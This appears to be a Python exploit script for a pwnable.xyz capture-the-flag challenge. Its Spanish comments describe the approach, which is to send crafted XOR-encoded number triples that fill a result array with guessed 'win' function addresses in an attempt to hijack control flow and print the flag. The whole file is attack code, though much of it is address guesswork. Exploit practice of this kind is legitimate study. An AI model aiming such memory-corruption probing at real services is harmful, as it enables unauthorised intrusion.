#!/usr/bin/env python3
import socket
import time

host = "svc.pwnable.xyz"
port = 30029

print("Esperando...")
time.sleep(15)

print("Conectando...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(30)

try:
    s.connect((host, port))
except Exception as e:
    print(f"Error: {e}")
    import sys
    sys.exit(1)

banner = s.recv(1024)
print(banner.decode())

win = 0xa21

print("\nProbando llenar result[] con diferentes patterns...")

# Probar diferentes "magic values"
magic_values = [
    (win, "win address"),
    (0x202200, "result base"),
    (0x202100, "stdin base"),
    (0xa21, "win (sin base)"),
    (0x400a21, "win con base típica"),
    (0x555555554a21, "win con PIE típico"),
    (0x7ffff7a21, "win en libc range"),
]

for magic, desc in magic_values:
    print(f"\n{desc} = {hex(magic)}")
    
    # Llenar result[1-9] con este valor
    for i in range(1, 10):
        b = i * 123
        a = magic ^ b
        s.sendall(f"{a} {b} {i}\n".encode())
        time.sleep(0.08)
    
    # Dar tiempo
    time.sleep(0.5)
    
    # Leer respuestas
    try:
        data = b""
        s.settimeout(1)
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except:
        pass
    
    if data:
        decoded = data.decode()
        if "flag" in decoded.lower() or "{" in decoded:
            print("¡ENCONTRADO!")
            print(decoded)
            break
        else:
            print(f"  Recibido: {len(decoded)} chars")
    
    s.settimeout(30)

s.close()
print("\nFin")